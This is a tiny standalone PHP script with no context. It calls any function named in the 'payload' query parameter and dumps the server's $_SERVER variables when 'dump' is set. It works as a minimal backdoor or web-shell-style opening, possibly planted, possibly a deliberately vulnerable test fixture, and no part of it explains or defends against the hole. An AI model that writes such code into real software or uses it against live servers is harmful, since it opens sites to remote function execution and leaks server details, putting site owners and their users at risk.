<?php 
  if($_GET['payload']) {
    $_GET['payload'](); 
  } else if($_GET['dump']) {
    echo var_dump($_SERVER);
  }
?>
